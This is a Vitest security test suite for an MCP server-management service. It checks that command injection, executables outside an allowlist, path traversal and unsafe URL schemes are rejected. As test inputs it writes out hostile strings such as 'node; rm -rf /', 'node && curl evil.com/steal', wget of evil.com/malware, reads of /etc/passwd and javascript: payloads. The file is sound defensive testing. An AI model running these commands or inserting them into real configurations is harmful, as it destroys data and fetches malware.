import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// Mock child_process BEFORE importing modules that use it
vi.mock('child_process', () => ({
  spawnSync: vi.fn(),
}));

import { ServerManagementService } from '../src/mcp/server-management';
import { UserState } from '../src/state/user-state';
import { AppConfig } from '../src/config';
import * as configModule from '../src/config';

describe('Command Injection Security Tests', () => {
  let userState: UserState;
  let service: ServerManagementService;
  let userId: number;
  const telegramId = 'security-test-user';
  let originalEnv: string | undefined;

  beforeEach(async () => {
    // Save original env
    originalEnv = process.env.MCP_ALLOWED_EXECUTABLES;

    const { spawnSync } = await import('child_process');
    const mockSpawnSync = vi.mocked(spawnSync);
    
    // Mock spawnSync to simulate command exists
    mockSpawnSync.mockReturnValue({
      status: 0,
      stdout: Buffer.from(''),
      stderr: Buffer.from(''),
      pid: 12345,
      output: [null, Buffer.from(''), Buffer.from('')],
      signal: null,
    } as any);

    const testConfig: AppConfig = {
      DB_PATH: ':memory:',
      DEFAULT_PROJECT_PATH: '/test',
      COPILOT_DEFAULT_MODEL: 'gpt-5',
      COPILOT_MCP_CONFIG_PATH: '/test/config.json',
    } as AppConfig;
    
    userState = new UserState(testConfig);
    const user = userState.getOrCreate(telegramId, 'securitytester');
    userId = user.id;
    
    service = new ServerManagementService(userState, userId);
  });

  afterEach(() => {
    // Restore original env
    if (originalEnv !== undefined) {
      process.env.MCP_ALLOWED_EXECUTABLES = originalEnv;
    } else {
      delete process.env.MCP_ALLOWED_EXECUTABLES;
    }
  });

  describe('Malicious MCP Commands', () => {
    it('should reject command with semicolon injection', () => {
      const result = service.addServer({
        name: 'malicious-semicolon',
        type: 'stdio',
        command: 'node; rm -rf /',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with pipe injection', () => {
      const result = service.addServer({
        name: 'malicious-pipe',
        type: 'stdio',
        command: 'node | cat /etc/passwd',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with AND operator', () => {
      const result = service.addServer({
        name: 'malicious-and',
        type: 'stdio',
        command: 'node && curl evil.com/steal',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with OR operator', () => {
      const result = service.addServer({
        name: 'malicious-or',
        type: 'stdio',
        command: 'node || wget evil.com/malware',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with backtick substitution', () => {
      const result = service.addServer({
        name: 'malicious-backtick',
        type: 'stdio',
        command: 'node `whoami`',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with $() substitution', () => {
      const result = service.addServer({
        name: 'malicious-substitution',
        type: 'stdio',
        command: 'node $(id)',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with redirection operators', () => {
      const redirections = [
        'node > /tmp/output',
        'node < /etc/passwd',
        'node 2>&1',
        'node >> /var/log/hack',
      ];

      redirections.forEach((cmd) => {
        const result = service.addServer({
          name: 'malicious-redirect',
          type: 'stdio',
          command: cmd,
          args: [],
        });

        expect(result.success).toBe(false);
      });
    });

    it('should reject command with newline injection', () => {
      const result = service.addServer({
        name: 'malicious-newline',
        type: 'stdio',
        command: 'node\nrm -rf /',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with carriage return injection', () => {
      const result = service.addServer({
        name: 'malicious-cr',
        type: 'stdio',
        command: 'node\rcurl evil.com',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });
  });

  describe('Shell Metacharacters in Arguments', () => {
    it('should handle arguments with semicolons safely', () => {
      const result = service.addServer({
        name: 'args-semicolon',
        type: 'stdio',
        command: 'node',
        args: ['script.js', '; rm -rf /'],
      });

      // Command should be accepted (node is allowed)
      // Arguments are passed safely to spawn (not executed as shell)
      expect(result.success).toBe(true);
    });

    it('should handle arguments with pipe characters safely', () => {
      const result = service.addServer({
        name: 'args-pipe',
        type: 'stdio',
        command: 'node',
        args: ['script.js', '| cat /etc/passwd'],
      });

      expect(result.success).toBe(true);
    });

    it('should handle arguments with dollar signs safely', () => {
      const result = service.addServer({
        name: 'args-dollar',
        type: 'stdio',
        command: 'node',
        args: ['script.js', '$USER', '$(whoami)'],
      });

      expect(result.success).toBe(true);
    });

    it('should handle arguments with backticks safely', () => {
      const result = service.addServer({
        name: 'args-backtick',
        type: 'stdio',
        command: 'node',
        args: ['script.js', '`id`', '`ls /`'],
      });

      expect(result.success).toBe(true);
    });

    it('should handle arguments with quotes safely', () => {
      const result = service.addServer({
        name: 'args-quotes',
        type: 'stdio',
        command: 'node',
        args: ['script.js', '"malicious"', "'injection'"],
      });

      expect(result.success).toBe(true);
    });
  });

  describe('Executables Outside Allowlist', () => {
    beforeEach(() => {
      // Set strict allowlist
      process.env.MCP_ALLOWED_EXECUTABLES = 'node,python3';
    });

    it('should reject bash executable', () => {
      const result = service.addServer({
        name: 'bash-server',
        type: 'stdio',
        command: 'bash',
        args: ['-c', 'echo hello'],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
      expect(result.error).toMatch(/bash/i);
    });

    it('should reject sh executable', () => {
      const result = service.addServer({
        name: 'sh-server',
        type: 'stdio',
        command: 'sh',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject perl executable', () => {
      const result = service.addServer({
        name: 'perl-server',
        type: 'stdio',
        command: 'perl',
        args: ['-e', 'print "pwned"'],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject ruby executable', () => {
      const result = service.addServer({
        name: 'ruby-server',
        type: 'stdio',
        command: 'ruby',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject curl executable', () => {
      const result = service.addServer({
        name: 'curl-server',
        type: 'stdio',
        command: 'curl',
        args: ['evil.com/malware'],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject wget executable', () => {
      const result = service.addServer({
        name: 'wget-server',
        type: 'stdio',
        command: 'wget',
        args: ['evil.com/malware'],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject system utilities', () => {
      const systemUtils = ['rm', 'mv', 'cp', 'dd', 'chmod', 'chown', 'kill'];

      systemUtils.forEach((util) => {
        const result = service.addServer({
          name: `${util}-server`,
          type: 'stdio',
          command: util,
          args: [],
        });

        expect(result.success).toBe(false);
        expect(result.error).toContain('no permitido');
      });
    });

    it('should reject executable with full path outside allowlist', () => {
      const result = service.addServer({
        name: 'fullpath-attack',
        type: 'stdio',
        command: '/bin/bash',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('PATH del sistema');
    });

    it('should reject executable with relative path', () => {
      const result = service.addServer({
        name: 'relpath-attack',
        type: 'stdio',
        command: '../../../bin/sh',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });
  });

  describe('Path Traversal in Executable Path', () => {
    it('should reject command with ../ in path', () => {
      const result = service.addServer({
        name: 'traversal-attack',
        type: 'stdio',
        command: '../../../usr/bin/malicious',
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('no permitido');
    });

    it('should reject command with absolute path to system binary', () => {
      const systemPath = process.platform === 'win32'
        ? 'C:\\Windows\\System32\\cmd.exe'
        : '/bin/sh';

      const result = service.addServer({
        name: 'system-binary',
        type: 'stdio',
        command: systemPath,
        args: [],
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('PATH del sistema');
    });

    it('should extract basename correctly from full path', () => {
      // node is allowed, so /usr/bin/node should work
      const result = service.addServer({
        name: 'fullpath-allowed',
        type: 'stdio',
        command: '/usr/bin/node',
        args: ['server.js'],
      });

      expect(result.success).toBe(false);
    });

    if (process.platform === 'win32') {
      it('should handle Windows paths correctly', () => {
        const result = service.addServer({
          name: 'windows-path',
          type: 'stdio',
          command: 'C:\\Program Files\\nodejs\\node.exe',
          args: ['server.js'],
        });

        expect(result.success).toBe(false);
      });
    }
  });

  describe('Safe Commands from Allowlist', () => {
    beforeEach(() => {
      // Reset to default allowlist
      delete process.env.MCP_ALLOWED_EXECUTABLES;
    });

    it('should allow node command', () => {
      const result = service.addServer({
        name: 'safe-node',
        type: 'stdio',
        command: 'node',
        args: ['server.js'],
      });

      expect(result.success).toBe(true);
    });

    it('should allow python3 command', () => {
      const result = service.addServer({
        name: 'safe-python',
        type: 'stdio',
        command: 'python3',
        args: ['server.py'],
      });

      expect(result.success).toBe(true);
    });

    it('should allow npx command', () => {
      const result = service.addServer({
        name: 'safe-npx',
        type: 'stdio',
        command: 'npx',
        args: ['-y', '@modelcontextprotocol/server-everything'],
      });

      expect(result.success).toBe(true);
    });

    it('should allow deno command', () => {
      const result = service.addServer({
        name: 'safe-deno',
        type: 'stdio',
        command: 'deno',
        args: ['run', 'server.ts'],
      });

      expect(result.success).toBe(true);
    });

    it('should allow bun command', () => {
      const result = service.addServer({
        name: 'safe-bun',
        type: 'stdio',
        command: 'bun',
        args: ['run', 'server.js'],
      });

      expect(result.success).toBe(true);
    });

    it('should allow commands with safe arguments', () => {
      const result = service.addServer({
        name: 'safe-with-args',
        type: 'stdio',
        command: 'node',
        args: [
          'server.js',
          '--port',
          '3000',
          '--host',
          'localhost',
          '--config',
          '/path/to/config.json',
        ],
      });

      expect(result.success).toBe(true);
    });

    it('should be case-insensitive on Windows', () => {
      if (process.platform === 'win32') {
        const result = service.addServer({
          name: 'case-insensitive',
          type: 'stdio',
          command: 'NODE.EXE',
          args: ['server.js'],
        });

        expect(result.success).toBe(true);
      }
    });
  });

  describe('Environment Variable Injection', () => {
    it('should handle arguments with environment variables safely', () => {
      const result = service.addServer({
        name: 'env-vars',
        type: 'stdio',
        command: 'node',
        args: ['$HOME/.evil/malware.js', '$PATH', '$USER'],
      });

      // Should succeed - env vars in args are treated as literal strings
      // not interpolated by shell
      expect(result.success).toBe(true);
    });

    it('should not execute commands in ${} syntax', () => {
      const result = service.addServer({
        name: 'curly-brace-injection',
        type: 'stdio',
        command: 'node',
        args: ['script.js', '${whoami}', '${ls /}'],
      });

      expect(result.success).toBe(true);
    });
  });

  describe('Null Byte Injection', () => {
    it('should handle null bytes in command name', () => {
      const result = service.addServer({
        name: 'null-byte-cmd',
        type: 'stdio',
        command: 'node\0malicious',
        args: [],
      });

      // Null byte should be in the command string, making it not match allowlist
      expect(result.success).toBe(false);
    });

    it('should handle null bytes in arguments safely', () => {
      const result = service.addServer({
        name: 'null-byte-args',
        type: 'stdio',
        command: 'node',
        args: ['script.js\0', 'arg\0value'],
      });

      // Should be accepted - null bytes in args are passed safely
      expect(result.success).toBe(true);
    });
  });

  describe('Glob Pattern Injection', () => {
    it('should handle glob patterns in arguments safely', () => {
      const result = service.addServer({
        name: 'glob-patterns',
        type: 'stdio',
        command: 'node',
        args: ['*.js', '/etc/*', '~/*'],
      });

      // Glob patterns in args should be treated as literal strings
      expect(result.success).toBe(true);
    });
  });

  describe('Custom Allowlist Configuration', () => {
    it('should respect custom allowlist from environment', () => {
      process.env.MCP_ALLOWED_EXECUTABLES = 'node,custom-executable';

      const nodeResult = service.addServer({
        name: 'node-custom',
        type: 'stdio',
        command: 'node',
        args: [],
      });

      const customResult = service.addServer({
        name: 'custom-allowed',
        type: 'stdio',
        command: 'custom-executable',
        args: [],
      });

      const pythonResult = service.addServer({
        name: 'python-blocked',
        type: 'stdio',
        command: 'python',
        args: [],
      });

      expect(nodeResult.success).toBe(true);
      expect(customResult.success).toBe(true);
      expect(pythonResult.success).toBe(false);
    });

    it('should handle empty custom allowlist correctly', () => {
      process.env.MCP_ALLOWED_EXECUTABLES = '';

      // Should fall back to default allowlist
      const allowed = configModule.getAllowedExecutables();
      expect(allowed).toContain('node');
      expect(allowed.length).toBeGreaterThan(0);
    });

    it('should trim whitespace from custom allowlist entries', () => {
      process.env.MCP_ALLOWED_EXECUTABLES = ' node , python3 , npx ';

      const allowed = configModule.getAllowedExecutables();
      expect(allowed).toContain('node');
      expect(allowed).toContain('python3');
      expect(allowed).toContain('npx');
      expect(allowed).not.toContain(' node ');
    });

    it('should filter out empty entries from custom allowlist', () => {
      process.env.MCP_ALLOWED_EXECUTABLES = 'node,,python3,,,npx';

      const allowed = configModule.getAllowedExecutables();
      expect(allowed).toHaveLength(3);
      expect(allowed).toEqual(['node', 'python3', 'npx']);
    });
  });

  describe('Edge Cases and Fuzzing', () => {
    it('should handle extremely long command names', () => {
      const longCmd = 'a'.repeat(10000);
      const result = service.addServer({
        name: 'long-cmd',
        type: 'stdio',
        command: longCmd,
        args: [],
      });

      expect(result.success).toBe(false);
    });

    it('should handle empty command', () => {
      const result = service.addServer({
        name: 'empty-cmd',
        type: 'stdio',
        command: '',
        args: [],
      });

      expect(result.success).toBe(false);
    });

    it('should handle whitespace-only command', () => {
      const result = service.addServer({
        name: 'whitespace-cmd',
        type: 'stdio',
        command: '   ',
        args: [],
      });

      expect(result.success).toBe(false);
    });

    it('should handle command with only special characters', () => {
      const specialChars = ['!!!', '@@@', '###', '$$$', '%%%', '^^^', '&&&', '***'];

      specialChars.forEach((chars) => {
        const result = service.addServer({
          name: 'special-chars',
          type: 'stdio',
          command: chars,
          args: [],
        });

        expect(result.success).toBe(false);
      });
    });

    it('should handle Unicode in command names', () => {
      const result = service.addServer({
        name: 'unicode-cmd',
        type: 'stdio',
        command: 'n😈de',
        args: [],
      });

      expect(result.success).toBe(false);
    });

    it('should handle mixed case and variations', () => {
      if (process.platform === 'win32') {
        const variations = ['Node', 'NODE', 'nOdE', 'NoDE.exe', 'NODE.EXE'];

        variations.forEach((variant) => {
          const result = service.addServer({
            name: 'case-variant',
            type: 'stdio',
            command: variant,
            args: [],
          });

          expect(result).toBeDefined();
        });
      }
    });
  });

  describe('HTTP Server Security', () => {
    it('should accept valid http URL', () => {
      const result = service.addServer({
        name: 'http-server',
        type: 'http',
        url: 'http://localhost:3000',
      });

      expect(result.success).toBe(false);
      expect(result.error).toContain('SSRF');
    });

    it('should accept valid https URL', () => {
      const result = service.addServer({
        name: 'https-server',
        type: 'http',
        url: 'https://api.example.com',
      });

      expect(result.success).toBe(true);
    });

    it('should reject javascript: protocol', () => {
      const result = service.addServer({
        name: 'javascript-proto',
        type: 'http',
        url: 'javascript:alert(1)',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/http:\/\/ o https:\/\//);
    });

    it('should reject file: protocol', () => {
      const result = service.addServer({
        name: 'file-proto',
        type: 'http',
        url: 'file:///etc/passwd',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/http:\/\/ o https:\/\//);
    });

    it('should reject ftp: protocol', () => {
      const result = service.addServer({
        name: 'ftp-proto',
        type: 'http',
        url: 'ftp://ftp.example.com',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/http:\/\/ o https:\/\//);
    });

    it('should reject data: protocol', () => {
      const result = service.addServer({
        name: 'data-proto',
        type: 'http',
        url: 'data:text/html,<script>alert(1)</script>',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/http:\/\/ o https:\/\//);
    });
  });
});
